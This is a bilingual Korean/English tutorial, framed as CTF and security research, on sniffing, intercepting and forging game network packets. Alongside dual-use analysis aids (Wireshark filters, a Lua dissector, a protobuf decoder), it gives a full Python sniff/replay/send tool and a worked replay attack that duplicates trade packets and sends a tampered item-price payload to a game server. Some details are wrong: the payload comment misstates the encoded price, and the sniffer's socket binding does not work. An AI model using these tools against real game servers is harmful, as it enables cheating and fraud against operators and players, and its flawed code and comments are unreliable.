> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 03. 게임 패킷 조작 (Game Packet Manipulation)

게임 네트워크 트래픽을 분석하고 조작하는 방법을 다룬다. TCP/UDP 프로토콜 분석, 패킷 스니핑, 중간자 공격, 커스텀 프로토콜 역분석까지 포함한다. 모든 내용은 CTF, 보안 연구 목적으로 작성되었다.

---

## 1. 게임 네트워크 프로토콜 개요

### 1.1 TCP vs UDP 게임 트래픽

| 항목         | TCP                        | UDP                           |
|-------------|---------------------------|-------------------------------|
| 사용 게임     | MMORPG, 카드 게임, 전략    | FPS, 레이싱, RTS              |
| 특징         | 신뢰성, 순서 보장          | 빠른 전송, 패킷 손실 허용     |
| 패킷 헤더     | 복잡 (20바이트 이상)       | 간단 (8바이트)                |
| 취약점       | 연결 유지 중 재전송 공격   | UDP Flood, 패킷 재현 공격     |

### 1.2 게임 패킷 구조 (일반적인 형태)

```
┌──────────────────────────────────────────────┐
│  패킷 헤더                                     │
│  ┌──────────┬──────────┬──────────────────┐   │
│  │ 패킷 길이 │ 패킷 ID  │ 시퀀스 번호      │   │
│  │  2 bytes │  2 bytes │    4 bytes       │   │
│  └──────────┴──────────┴──────────────────┘   │
├──────────────────────────────────────────────┤
│  페이로드 (가변 길이)                          │
│  ┌────────────────────────────────────────┐   │
│  │  데이터 (평문 또는 암호화/압축)          │   │
│  └────────────────────────────────────────┘   │
├──────────────────────────────────────────────┤
│  체크섬/HMAC (선택)                           │
└──────────────────────────────────────────────┘
```

---

## 2. Wireshark 게임 패킷 분석

### 2.1 기본 캡처 설정

```bash
# 특정 포트 필터 (대부분의 게임서버: 7777, 25565, 27015 등)
tcp.port == 7777 or udp.port == 7777

# 특정 IP 주소
ip.addr == 192.168.1.100

# 패킷 크기로 필터 (짧은 게임 패킷 위주)
frame.len < 100

# TCP 스트림 재조합
tcp.stream eq 5

# UDP 게임 트래픽 (헤더 제외 페이로드)
udp.length > 8 and udp.port == 27015
```

### 2.2 커맨드라인 캡처 (tshark)

```bash
# 특정 포트 캡처 (백그라운드 실행)
tshark -i eth0 -f "port 7777" -w game_traffic.pcap

# 실시간 패킷 내용 출력
tshark -i eth0 -f "port 7777" -T fields \
  -e frame.time -e ip.src -e tcp.srcport \
  -e data.data -E separator=, -E quote=d

# pcap 파일 분석 (특정 스트림)
tshark -r game_traffic.pcap -z "follow,tcp,ascii,0"

# UDP 페이로드 16진수 출력
tshark -r game_traffic.pcap -T fields \
  -e frame.number -e udp.payload -Y "udp.port==7777"
```

### 2.3 Lua 플러그인으로 게임 프로토콜 디코더 작성

```lua
-- Wireshark Lua 플러그인 예시 (게임 프로토콜 디코더)
-- 저장 위치: ~/.config/wireshark/plugins/game_proto.lua

local proto_game = Proto("gameproto", "Custom Game Protocol")

-- 필드 정의
local f_len      = ProtoField.uint16("gameproto.length",    "패킷 길이",   base.DEC)
local f_id       = ProtoField.uint16("gameproto.id",        "패킷 ID",     base.HEX)
local f_seq      = ProtoField.uint32("gameproto.seq",       "시퀀스",      base.DEC)
local f_payload  = ProtoField.bytes ("gameproto.payload",   "페이로드")

proto_game.fields = { f_len, f_id, f_seq, f_payload }

-- 패킷 ID 매핑
local PACKET_NAMES = {
    [0x0001] = "LOGIN_REQUEST",
    [0x0002] = "LOGIN_RESPONSE",
    [0x0010] = "MOVE",
    [0x0011] = "ATTACK",
    [0x0020] = "CHAT",
    [0x0030] = "ITEM_USE",
    [0x00FF] = "HEARTBEAT",
}

function proto_game.dissector(buffer, pinfo, tree)
    if buffer:len() < 8 then return end

    pinfo.cols.protocol = proto_game.name

    local subtree = tree:add(proto_game, buffer(), "Game Packet")
    local length  = buffer(0, 2):uint()
    local pkt_id  = buffer(2, 2):uint()
    local seq     = buffer(4, 4):uint()

    subtree:add(f_len, buffer(0, 2))
    subtree:add(f_id,  buffer(2, 2)):append_text(
        " (" .. (PACKET_NAMES[pkt_id] or "UNKNOWN") .. ")"
    )
    subtree:add(f_seq, buffer(4, 4))

    if buffer:len() > 8 then
        subtree:add(f_payload, buffer(8))
    end

    pinfo.cols.info:set(
        string.format("Seq=%d ID=0x%04X (%s) Len=%d",
            seq, pkt_id, PACKET_NAMES[pkt_id] or "UNKNOWN", length)
    )
end

local tcp_port_table = DissectorTable.get("tcp.port")
tcp_port_table:add(7777, proto_game)
```

---

## 3. mitmproxy를 이용한 중간자 공격

### 3.1 기본 설정

```bash
# mitmproxy 설치
pip install mitmproxy

# 투명 프록시 모드 (TCP 스트림)
mitmproxy --mode transparent --rawtcp

# 특정 포트 포워드
mitmproxy -p 8080 --mode regular

# 커맨드라인 모드 (스크립트 실행)
mitmdump -s game_intercept.py -p 8080
```

### 3.2 게임 TCP 트래픽 인터셉터 스크립트

```python
#!/usr/bin/env python3
"""
mitmproxy 게임 트래픽 인터셉터 스크립트
사용: mitmdump -s game_intercept.py --mode transparent --rawtcp
"""

from mitmproxy import tcp, ctx
from mitmproxy.connection import ConnectionState
import struct
import binascii


# 게임 패킷 ID 매핑
PACKET_IDS = {
    0x0001: "LOGIN_REQUEST",
    0x0002: "LOGIN_RESPONSE",
    0x0010: "PLAYER_MOVE",
    0x0011: "PLAYER_ATTACK",
    0x0020: "CHAT_MESSAGE",
    0x0030: "ITEM_USE",
}


def parse_game_packet(data: bytes) -> dict | None:
    """게임 패킷 헤더 파싱 (길이 + ID + 시퀀스 = 8바이트)"""
    if len(data) < 8:
        return None

    try:
        length, pkt_id, seq = struct.unpack(">HHI", data[:8])
        payload = data[8:8 + length - 8] if length > 8 else b""
        return {
            "length": length,
            "id": pkt_id,
            "id_name": PACKET_IDS.get(pkt_id, f"UNKNOWN_0x{pkt_id:04X}"),
            "seq": seq,
            "payload": payload,
        }
    except struct.error:
        return None


def tcp_start(flow: tcp.TCPFlow) -> None:
    ctx.log.info(f"[TCP] 연결 시작: {flow.client_conn.address} -> {flow.server_conn.address}")


def tcp_message(flow: tcp.TCPFlow) -> None:
    msg = flow.messages[-1]
    direction = "C→S" if msg.from_client else "S→C"
    raw = bytes(msg.content)

    pkt = parse_game_packet(raw)
    if pkt:
        ctx.log.info(
            f"[{direction}] {pkt['id_name']} seq={pkt['seq']} "
            f"len={pkt['length']} payload={pkt['payload'].hex()}"
        )

        # 패킷 조작 예시: PLAYER_MOVE 패킷에서 좌표 변조
        if pkt["id"] == 0x0010 and msg.from_client:
            payload = bytearray(pkt["payload"])
            if len(payload) >= 12:
                # 좌표 오프셋: X(0), Y(4), Z(8) — float32
                x, y, z = struct.unpack_from("<fff", payload, 0)
                ctx.log.info(f"  좌표: X={x:.2f} Y={y:.2f} Z={z:.2f}")
                # Y 좌표를 강제로 0으로 (벽 통과 방지 테스트)
                # struct.pack_into("<f", payload, 4, 0.0)
                # msg.content = bytes(payload)  # 실제 변조 시 주석 해제
    else:
        # 헤더 파싱 실패 시 원시 16진수 출력
        ctx.log.debug(f"[{direction}] RAW: {raw.hex()[:64]}...")


def tcp_end(flow: tcp.TCPFlow) -> None:
    ctx.log.info(f"[TCP] 연결 종료: {flow.client_conn.address}")
```

---

## 4. 커스텀 패킷 전송 도구

### 4.1 완성형 게임 패킷 스니퍼/수정 도구

```python
#!/usr/bin/env python3
"""
게임 패킷 스니퍼 및 재전송 도구 (CTF/보안 연구 목적)
pcap 파일 분석, 실시간 스니핑, 패킷 재전송 기능 포함
"""

import socket
import struct
import argparse
import sys
import time
import threading
import json
from pathlib import Path
from typing import Iterator, Optional
from dataclasses import dataclass, field


@dataclass
class GamePacket:
    """파싱된 게임 패킷"""
    raw: bytes
    direction: str = "unknown"   # "client" / "server"
    timestamp: float = 0.0
    length: int = 0
    pkt_id: int = 0
    seq: int = 0
    payload: bytes = b""

    @classmethod
    def from_bytes(cls, data: bytes, direction: str = "unknown") -> "GamePacket":
        if len(data) < 8:
            return cls(raw=data, direction=direction,
                       timestamp=time.time(), payload=data)

        length, pkt_id, seq = struct.unpack(">HHI", data[:8])
        payload = data[8:]
        return cls(
            raw=data,
            direction=direction,
            timestamp=time.time(),
            length=length,
            pkt_id=pkt_id,
            seq=seq,
            payload=payload,
        )

    def to_dict(self) -> dict:
        return {
            "direction": self.direction,
            "timestamp": self.timestamp,
            "length": self.length,
            "id": hex(self.pkt_id),
            "seq": self.seq,
            "payload": self.payload.hex(),
        }


class PcapReader:
    """pcap 파일 리더 (libpcap 의존 없이 직접 파싱)"""

    PCAP_MAGIC = 0xa1b2c3d4
    PCAP_MAGIC_NS = 0xa1b23c4d
    GLOBAL_HEADER_SIZE = 24
    RECORD_HEADER_SIZE = 16

    def __init__(self, filepath: str) -> None:
        self.filepath = filepath
        self._data: bytes = b""
        self._offset: int = 0
        self._little_endian: bool = True
        self._nanosec: bool = False

    def _read_uint32(self) -> int:
        fmt = "<I" if self._little_endian else ">I"
        val = struct.unpack_from(fmt, self._data, self._offset)[0]
        self._offset += 4
        return val

    def _read_uint16(self) -> int:
        fmt = "<H" if self._little_endian else ">H"
        val = struct.unpack_from(fmt, self._data, self._offset)[0]
        self._offset += 2
        return val

    def open(self) -> None:
        path = Path(self.filepath)
        if not path.exists():
            raise FileNotFoundError(f"파일 미발견: {self.filepath}")
        self._data = path.read_bytes()
        self._offset = 0

        # 매직 번호 확인
        magic = struct.unpack_from("<I", self._data, 0)[0]
        if magic == self.PCAP_MAGIC:
            self._little_endian = True
        elif magic == self.PCAP_MAGIC_NS:
            self._little_endian = True
            self._nanosec = True
        elif magic == struct.unpack(">I", struct.pack("<I", self.PCAP_MAGIC))[0]:
            self._little_endian = False
        else:
            raise ValueError(f"유효하지 않은 pcap 파일: magic=0x{magic:08X}")

        # 글로벌 헤더 건너뜀
        self._offset = self.GLOBAL_HEADER_SIZE

    def packets(self) -> Iterator[tuple[float, bytes]]:
        """(타임스탬프, 패킷 데이터) 이터레이터"""
        while self._offset + self.RECORD_HEADER_SIZE <= len(self._data):
            ts_sec  = self._read_uint32()
            ts_usec = self._read_uint32()
            incl_len = self._read_uint32()
            _orig_len = self._read_uint32()

            if self._offset + incl_len > len(self._data):
                break

            pkt_data = self._data[self._offset:self._offset + incl_len]
            self._offset += incl_len

            timestamp = ts_sec + (ts_usec / 1e9 if self._nanosec else ts_usec / 1e6)
            yield timestamp, pkt_data


def extract_tcp_payload(frame: bytes) -> Optional[bytes]:
    """Ethernet + IP + TCP 헤더 제거 후 페이로드 추출"""
    try:
        if len(frame) < 14:
            return None

        eth_type = struct.unpack_from(">H", frame, 12)[0]
        if eth_type != 0x0800:  # IPv4 만 처리
            return None

        ip_start = 14
        if len(frame) < ip_start + 20:
            return None

        ip_ihl = (frame[ip_start] & 0x0F) * 4
        ip_proto = frame[ip_start + 9]

        if ip_proto != 6:  # TCP
            return None

        tcp_start = ip_start + ip_ihl
        if len(frame) < tcp_start + 20:
            return None

        tcp_data_offset = ((frame[tcp_start + 12] >> 4) & 0xF) * 4
        payload_start = tcp_start + tcp_data_offset

        if payload_start >= len(frame):
            return None

        return frame[payload_start:]
    except (struct.error, IndexError):
        return None


class PacketReplayer:
    """게임 패킷 재전송 도구"""

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self._sock: Optional[socket.socket] = None

    def connect(self) -> None:
        self._sock = socket.create_connection((self.host, self.port), timeout=10)
        print(f"[*] 연결: {self.host}:{self.port}")

    def send(self, data: bytes) -> bytes:
        """패킷 전송 후 응답 수신"""
        if not self._sock:
            raise RuntimeError("연결되지 않음")
        self._sock.sendall(data)
        response = b""
        self._sock.settimeout(2.0)
        try:
            while True:
                chunk = self._sock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        return response

    def build_packet(self, pkt_id: int, seq: int, payload: bytes) -> bytes:
        """게임 패킷 빌더"""
        total_len = 8 + len(payload)
        header = struct.pack(">HHI", total_len, pkt_id, seq)
        return header + payload

    def replay_from_file(self, capture_file: str, target_ids: list[int]) -> None:
        """pcap 파일에서 특정 패킷 ID만 재전송"""
        reader = PcapReader(capture_file)
        reader.open()

        count = 0
        for ts, frame in reader.packets():
            payload = extract_tcp_payload(frame)
            if payload and len(payload) >= 8:
                pkt = GamePacket.from_bytes(payload)
                if pkt.pkt_id in target_ids:
                    print(f"[*] 재전송: ID=0x{pkt.pkt_id:04X} seq={pkt.seq}")
                    response = self.send(payload)
                    if response:
                        resp_pkt = GamePacket.from_bytes(response, "server")
                        print(f"    응답: {resp_pkt.to_dict()}")
                    count += 1
                    time.sleep(0.05)

        print(f"[*] 재전송 완료: {count}개 패킷")

    def close(self) -> None:
        if self._sock:
            self._sock.close()


class LiveSniffer:
    """실시간 패킷 스니퍼 (raw socket, root 필요)"""

    def __init__(self, interface: str, port_filter: int) -> None:
        self.interface = interface
        self.port_filter = port_filter
        self._running = False
        self._packets: list[GamePacket] = []

    def start(self) -> None:
        """스니핑 시작 (별도 스레드)"""
        self._running = True
        t = threading.Thread(target=self._sniff_loop, daemon=True)
        t.start()
        print(f"[*] 스니핑 시작: {self.interface} 포트 {self.port_filter}")

    def _sniff_loop(self) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.bind((self.interface, 0))
            sock.settimeout(1.0)
        except PermissionError:
            print("[!] Raw socket은 root 권한 필요", file=sys.stderr)
            return

        while self._running:
            try:
                data, addr = sock.recvfrom(65535)
                self._process_raw(data, addr)
            except socket.timeout:
                continue

    def _process_raw(self, data: bytes, addr: tuple) -> None:
        """IP 패킷에서 TCP 페이로드 추출 및 게임 패킷 파싱"""
        if len(data) < 20:
            return

        ip_ihl = (data[0] & 0x0F) * 4
        proto = data[9]
        if proto != 6:
            return

        tcp_start = ip_ihl
        if len(data) < tcp_start + 20:
            return

        dst_port = struct.unpack_from(">H", data, tcp_start + 2)[0]
        src_port = struct.unpack_from(">H", data, tcp_start)[0]

        if self.port_filter not in (src_port, dst_port):
            return

        tcp_offset = ((data[tcp_start + 12] >> 4) & 0xF) * 4
        payload = data[tcp_start + tcp_offset:]

        if len(payload) >= 8:
            direction = "client" if src_port == self.port_filter else "server"
            pkt = GamePacket.from_bytes(payload, direction)
            self._packets.append(pkt)
            print(f"[{direction:6}] ID=0x{pkt.pkt_id:04X} seq={pkt.seq} "
                  f"payload={pkt.payload.hex()[:32]}")

    def stop(self) -> None:
        self._running = False

    def save(self, output: str) -> None:
        data = [p.to_dict() for p in self._packets]
        with open(output, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"[*] {len(data)}개 패킷 저장: {output}")


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="게임 패킷 분석/재전송 도구")
    sub = parser.add_subparsers(dest="command", required=True)

    # pcap 분석
    p_pcap = sub.add_parser("pcap", help="pcap 파일 분석")
    p_pcap.add_argument("file", help="분석할 .pcap 파일")
    p_pcap.add_argument("--filter-id", type=lambda x: int(x, 16),
                        nargs="+", help="필터링할 패킷 ID (16진수, 예: 0x0010)")
    p_pcap.add_argument("--output", "-o", help="결과 JSON 저장 경로")

    # 패킷 재전송
    p_replay = sub.add_parser("replay", help="pcap에서 패킷 재전송")
    p_replay.add_argument("file", help="pcap 파일")
    p_replay.add_argument("host", help="대상 서버 주소")
    p_replay.add_argument("port", type=int, help="대상 포트")
    p_replay.add_argument("--ids", type=lambda x: int(x, 16), nargs="+",
                          required=True, help="재전송할 패킷 ID 목록")

    # 실시간 스니핑
    p_sniff = sub.add_parser("sniff", help="실시간 패킷 스니핑 (root 필요)")
    p_sniff.add_argument("interface", help="네트워크 인터페이스 (예: eth0)")
    p_sniff.add_argument("port", type=int, help="캡처할 포트")
    p_sniff.add_argument("--output", "-o", default="capture.json", help="저장 파일")
    p_sniff.add_argument("--duration", "-d", type=int, default=30, help="캡처 시간(초)")

    # 커스텀 패킷 전송
    p_send = sub.add_parser("send", help="커스텀 패킷 전송")
    p_send.add_argument("host", help="서버 주소")
    p_send.add_argument("port", type=int, help="서버 포트")
    p_send.add_argument("--id", type=lambda x: int(x, 16), required=True,
                        help="패킷 ID (16진수)")
    p_send.add_argument("--seq", type=int, default=1, help="시퀀스 번호")
    p_send.add_argument("--payload", default="", help="페이로드 (16진수 문자열)")

    args = parser.parse_args()

    if args.command == "pcap":
        reader = PcapReader(args.file)
        reader.open()
        packets = []
        for ts, frame in reader.packets():
            payload = extract_tcp_payload(frame)
            if payload and len(payload) >= 8:
                pkt = GamePacket.from_bytes(payload)
                if args.filter_id is None or pkt.pkt_id in args.filter_id:
                    packets.append(pkt)
                    print(f"[{ts:.3f}] ID=0x{pkt.pkt_id:04X} seq={pkt.seq} "
                          f"payload={pkt.payload.hex()[:32]}")
        if args.output:
            with open(args.output, "w", encoding="utf-8") as f:
                json.dump([p.to_dict() for p in packets], f, indent=2, ensure_ascii=False)
            print(f"[*] 저장: {args.output}")

    elif args.command == "replay":
        replayer = PacketReplayer(args.host, args.port)
        replayer.connect()
        try:
            replayer.replay_from_file(args.file, args.ids)
        finally:
            replayer.close()

    elif args.command == "sniff":
        sniffer = LiveSniffer(args.interface, args.port)
        sniffer.start()
        try:
            time.sleep(args.duration)
        except KeyboardInterrupt:
            pass
        finally:
            sniffer.stop()
            sniffer.save(args.output)

    elif args.command == "send":
        payload = bytes.fromhex(args.payload) if args.payload else b""
        replayer = PacketReplayer(args.host, args.port)
        replayer.connect()
        try:
            pkt = replayer.build_packet(args.id, args.seq, payload)
            print(f"[*] 전송: {pkt.hex()}")
            response = replayer.send(pkt)
            if response:
                print(f"[*] 응답: {response.hex()}")
            else:
                print("[*] 응답 없음")
        finally:
            replayer.close()


if __name__ == "__main__":
    main()
```

---

## 5. Protocol Buffer 역분석

### 5.1 프로토버프 구조 수동 파싱

```python
#!/usr/bin/env python3
"""
Protocol Buffer 역분석 도구
proto 파일 없이 바이너리 프로토버프 디코딩
"""

import argparse
import sys
from enum import IntEnum


class WireType(IntEnum):
    VARINT = 0
    I64    = 1
    LEN    = 2
    I32    = 5


def decode_varint(data: bytes, pos: int) -> tuple[int, int]:
    """varint 디코딩, (값, 새 오프셋) 반환"""
    result = 0
    shift = 0
    while pos < len(data):
        byte = data[pos]
        pos += 1
        result |= (byte & 0x7F) << shift
        shift += 7
        if not (byte & 0x80):
            break
    return result, pos


def decode_protobuf(data: bytes, depth: int = 0) -> list[dict]:
    """프로토버프 바이너리 디코딩 (proto 없이)"""
    fields: list[dict] = []
    pos = 0
    indent = "  " * depth

    while pos < len(data):
        try:
            tag_wire, pos = decode_varint(data, pos)
        except Exception:
            break

        field_num = tag_wire >> 3
        wire_type = tag_wire & 0x07

        if wire_type == WireType.VARINT:
            value, pos = decode_varint(data, pos)
            fields.append({
                "field": field_num,
                "wire_type": "varint",
                "value": value,
                "signed": value if value < (1 << 63) else value - (1 << 64),
            })
            print(f"{indent}field {field_num} (varint): {value}")

        elif wire_type == WireType.I64:
            if pos + 8 > len(data):
                break
            import struct
            val_bytes = data[pos:pos + 8]
            int_val = struct.unpack("<Q", val_bytes)[0]
            float_val = struct.unpack("<d", val_bytes)[0]
            pos += 8
            fields.append({
                "field": field_num,
                "wire_type": "64bit",
                "int": int_val,
                "float": float_val,
                "hex": val_bytes.hex(),
            })
            print(f"{indent}field {field_num} (64bit): {int_val} / {float_val:.6f}")

        elif wire_type == WireType.LEN:
            length, pos = decode_varint(data, pos)
            if pos + length > len(data):
                break
            value_bytes = data[pos:pos + length]
            pos += length

            # 중첩 메시지 여부 추정 (재귀 시도)
            try:
                sub_fields = decode_protobuf(value_bytes, depth + 1)
                fields.append({
                    "field": field_num,
                    "wire_type": "len",
                    "type": "message",
                    "sub_fields": sub_fields,
                })
                print(f"{indent}field {field_num} (message, {length} bytes):")
            except Exception:
                # 문자열 또는 바이트로 처리
                try:
                    text = value_bytes.decode("utf-8")
                    fields.append({
                        "field": field_num,
                        "wire_type": "len",
                        "type": "string",
                        "value": text,
                    })
                    print(f"{indent}field {field_num} (string): {text!r}")
                except UnicodeDecodeError:
                    fields.append({
                        "field": field_num,
                        "wire_type": "len",
                        "type": "bytes",
                        "hex": value_bytes.hex(),
                    })
                    print(f"{indent}field {field_num} (bytes): {value_bytes.hex()}")

        elif wire_type == WireType.I32:
            if pos + 4 > len(data):
                break
            import struct
            val_bytes = data[pos:pos + 4]
            int_val = struct.unpack("<I", val_bytes)[0]
            float_val = struct.unpack("<f", val_bytes)[0]
            pos += 4
            fields.append({
                "field": field_num,
                "wire_type": "32bit",
                "int": int_val,
                "float": float_val,
            })
            print(f"{indent}field {field_num} (32bit): {int_val} / {float_val:.6f}")

        else:
            print(f"{indent}[!] 알 수 없는 wire_type={wire_type}, 중단")
            break

    return fields


def main() -> None:
    parser = argparse.ArgumentParser(description="Protocol Buffer 역분석 도구")
    parser.add_argument("input", help="분석할 프로토버프 바이너리 파일 (또는 hex 문자열)")
    parser.add_argument("--hex", action="store_true", help="입력이 16진수 문자열")
    args = parser.parse_args()

    if args.hex:
        data = bytes.fromhex(args.input.replace(" ", ""))
    else:
        from pathlib import Path
        data = Path(args.input).read_bytes()

    print(f"[*] 입력 크기: {len(data)} 바이트")
    print(f"[*] 16진수: {data.hex()}")
    print()
    print("[*] 디코딩 결과:")
    decode_protobuf(data)


if __name__ == "__main__":
    main()
```

---

## 6. 서버사이드 검증 우회 사례 분석

### 6.1 일반적인 취약한 패턴

```
취약한 구현 (서버):
  클라이언트가 보낸 아이템 가격을 그대로 신뢰
  → 패킷: {item_id: 1, price: 1, quantity: 1}
  → 조작: {item_id: 1, price: -9999, quantity: 999}
  → 결과: 골드가 증가

올바른 구현 (서버):
  아이템 ID로 서버 DB에서 가격을 조회하여 검증
  클라이언트에서 받은 price 값 무시
```

### 6.2 replay attack 시나리오

```bash
# 1. 정상 거래 패킷 캡처
python packet_tool.py sniff eth0 7777 --duration 60 --output trades.json

# 2. 특정 거래 패킷 ID 필터링
python packet_tool.py pcap game.pcap --filter-id 0x0030

# 3. 같은 거래 패킷 반복 전송 (서버 검증 없으면 중복 처리)
python packet_tool.py replay game.pcap target.server.com 7777 --ids 0x0030

# 4. 커스텀 패킷 직접 전송 (값 조작)
python packet_tool.py send target.server.com 7777 \
  --id 0x0030 --seq 1 \
  --payload "01000000FFFFFFFFFFFFFF7F"  # item_id=1, price=-1(조작)
```

### 6.3 Wireshark 패킷 분석 워크플로

```
1. tshark -i eth0 -f "host gameserver.com" -w capture.pcap
2. Wireshark로 capture.pcap 열기
3. tcp.port == 7777 필터 적용
4. Follow TCP Stream → 패킷 구조 파악
5. 관심 있는 패킷 우클릭 → Copy as Hex Stream
6. Python protobuf 역분석 도구로 구조 파악
7. 조작된 페이로드 생성 후 replay 도구로 전송
```

---

<a name="english"></a>

# 03. Game Packet Manipulation

This document covers methods for analyzing and manipulating game network traffic, including TCP/UDP protocol analysis, packet sniffing, man-in-the-middle attacks, and reverse engineering of custom protocols. All content is written for CTF and security research purposes.

---

## 1. Game Network Protocol Overview

### 1.1 TCP vs UDP Game Traffic

| Item         | TCP                              | UDP                                |
|-------------|----------------------------------|------------------------------------|
| Games       | MMORPG, card games, strategy     | FPS, racing, RTS                   |
| Features    | Reliability, ordered delivery    | Fast transmission, loss tolerant   |
| Packet Header | Complex (20+ bytes)            | Simple (8 bytes)                   |
| Vulnerabilities | Retransmission attacks while connected | UDP Flood, packet replay attacks |

### 1.2 Game Packet Structure (General Form)

```
┌──────────────────────────────────────────────┐
│  Packet Header                                │
│  ┌──────────┬──────────┬──────────────────┐  │
│  │  Length  │ Packet ID│  Sequence Number │  │
│  │  2 bytes │  2 bytes │    4 bytes       │  │
│  └──────────┴──────────┴──────────────────┘  │
├──────────────────────────────────────────────┤
│  Payload (variable length)                   │
│  ┌────────────────────────────────────────┐  │
│  │  Data (plaintext or encrypted/compressed)│ │
│  └────────────────────────────────────────┘  │
├──────────────────────────────────────────────┤
│  Checksum/HMAC (optional)                    │
└──────────────────────────────────────────────┘
```

---

## 2. Wireshark Game Packet Analysis

### 2.1 Basic Capture Filters

```bash
# Filter by specific port (most game servers: 7777, 25565, 27015, etc.)
tcp.port == 7777 or udp.port == 7777

# Filter by specific IP address
ip.addr == 192.168.1.100

# Filter by packet size (focusing on short game packets)
frame.len < 100

# TCP stream reassembly
tcp.stream eq 5

# UDP game traffic (payload excluding header)
udp.length > 8 and udp.port == 27015
```

### 2.2 Command-line Capture (tshark)

```bash
# Capture on a specific port (run in background)
tshark -i eth0 -f "port 7777" -w game_traffic.pcap

# Print packet contents in real-time
tshark -i eth0 -f "port 7777" -T fields \
  -e frame.time -e ip.src -e tcp.srcport \
  -e data.data -E separator=, -E quote=d

# Analyze pcap file (specific stream)
tshark -r game_traffic.pcap -z "follow,tcp,ascii,0"

# Print UDP payload as hex
tshark -r game_traffic.pcap -T fields \
  -e frame.number -e udp.payload -Y "udp.port==7777"
```

### 2.3 Writing a Game Protocol Decoder with a Lua Plugin

```lua
-- Wireshark Lua plugin example (game protocol decoder)
-- Save location: ~/.config/wireshark/plugins/game_proto.lua

local proto_game = Proto("gameproto", "Custom Game Protocol")

-- Field definitions
local f_len      = ProtoField.uint16("gameproto.length",    "Packet Length", base.DEC)
local f_id       = ProtoField.uint16("gameproto.id",        "Packet ID",     base.HEX)
local f_seq      = ProtoField.uint32("gameproto.seq",       "Sequence",      base.DEC)
local f_payload  = ProtoField.bytes ("gameproto.payload",   "Payload")

proto_game.fields = { f_len, f_id, f_seq, f_payload }

-- Packet ID mapping
local PACKET_NAMES = {
    [0x0001] = "LOGIN_REQUEST",
    [0x0002] = "LOGIN_RESPONSE",
    [0x0010] = "MOVE",
    [0x0011] = "ATTACK",
    [0x0020] = "CHAT",
    [0x0030] = "ITEM_USE",
    [0x00FF] = "HEARTBEAT",
}

function proto_game.dissector(buffer, pinfo, tree)
    if buffer:len() < 8 then return end
    pinfo.cols.protocol = proto_game.name
    -- (same dissector logic as Korean section)
end

local tcp_port_table = DissectorTable.get("tcp.port")
tcp_port_table:add(7777, proto_game)
```

---

## 3. Man-in-the-Middle Attack with mitmproxy

### 3.1 Basic Setup

```bash
# Install mitmproxy
pip install mitmproxy

# Transparent proxy mode (TCP stream)
mitmproxy --mode transparent --rawtcp

# Forward a specific port
mitmproxy -p 8080 --mode regular

# Command-line mode (run a script)
mitmdump -s game_intercept.py -p 8080
```

### 3.2 Game TCP Traffic Interceptor Script

```python
#!/usr/bin/env python3
"""
mitmproxy game traffic interceptor script
Usage: mitmdump -s game_intercept.py --mode transparent --rawtcp
"""

from mitmproxy import tcp, ctx
import struct

PACKET_IDS = {
    0x0001: "LOGIN_REQUEST",
    0x0002: "LOGIN_RESPONSE",
    0x0010: "PLAYER_MOVE",
    0x0011: "PLAYER_ATTACK",
    0x0020: "CHAT_MESSAGE",
    0x0030: "ITEM_USE",
}

def parse_game_packet(data: bytes) -> dict | None:
    """Parse game packet header (length + ID + sequence = 8 bytes)"""
    if len(data) < 8:
        return None
    try:
        length, pkt_id, seq = struct.unpack(">HHI", data[:8])
        payload = data[8:8 + length - 8] if length > 8 else b""
        return {
            "length": length,
            "id": pkt_id,
            "id_name": PACKET_IDS.get(pkt_id, f"UNKNOWN_0x{pkt_id:04X}"),
            "seq": seq,
            "payload": payload,
        }
    except struct.error:
        return None

def tcp_start(flow: tcp.TCPFlow) -> None:
    ctx.log.info(f"[TCP] Connection started: {flow.client_conn.address} -> {flow.server_conn.address}")

def tcp_message(flow: tcp.TCPFlow) -> None:
    msg = flow.messages[-1]
    direction = "C→S" if msg.from_client else "S→C"
    raw = bytes(msg.content)
    pkt = parse_game_packet(raw)
    if pkt:
        ctx.log.info(
            f"[{direction}] {pkt['id_name']} seq={pkt['seq']} "
            f"len={pkt['length']} payload={pkt['payload'].hex()}"
        )
        # Example: modify PLAYER_MOVE packet coordinates
        if pkt["id"] == 0x0010 and msg.from_client:
            payload = bytearray(pkt["payload"])
            if len(payload) >= 12:
                x, y, z = struct.unpack_from("<fff", payload, 0)
                ctx.log.info(f"  Coords: X={x:.2f} Y={y:.2f} Z={z:.2f}")
    else:
        ctx.log.debug(f"[{direction}] RAW: {raw.hex()[:64]}...")

def tcp_end(flow: tcp.TCPFlow) -> None:
    ctx.log.info(f"[TCP] Connection ended: {flow.client_conn.address}")
```

---

## 4. Custom Packet Sending Tool

### 4.1 Complete Game Packet Sniffer/Modifier Tool

The Python tool above (in the Korean section) provides:
- `pcap` subcommand: analyze pcap files
- `replay` subcommand: replay specific packet IDs from a pcap
- `sniff` subcommand: live packet sniffing (requires root)
- `send` subcommand: send custom packets

---

## 5. Protocol Buffer Reverse Engineering

### 5.1 Manual Protobuf Parsing

The Python tool decodes binary protobuf data without a `.proto` file, supporting all wire types: VARINT, 64-bit, length-delimited (strings, bytes, nested messages), and 32-bit.

---

## 6. Server-Side Validation Bypass Case Analysis

### 6.1 Common Vulnerable Patterns

```
Vulnerable implementation (server):
  Trusts the item price sent by the client directly
  → Packet: {item_id: 1, price: 1, quantity: 1}
  → Manipulated: {item_id: 1, price: -9999, quantity: 999}
  → Result: Gold increases

Correct implementation (server):
  Looks up the price from the server DB using the item ID
  Ignores the price value received from the client
```

### 6.2 Replay Attack Scenario

```bash
# 1. Capture normal transaction packets
python packet_tool.py sniff eth0 7777 --duration 60 --output trades.json

# 2. Filter specific transaction packet IDs
python packet_tool.py pcap game.pcap --filter-id 0x0030

# 3. Repeatedly send the same transaction packet (duplicates processed if no server check)
python packet_tool.py replay game.pcap target.server.com 7777 --ids 0x0030

# 4. Send a custom packet directly (with tampered values)
python packet_tool.py send target.server.com 7777 \
  --id 0x0030 --seq 1 \
  --payload "01000000FFFFFFFFFFFFFF7F"  # item_id=1, price=-1 (manipulated)
```

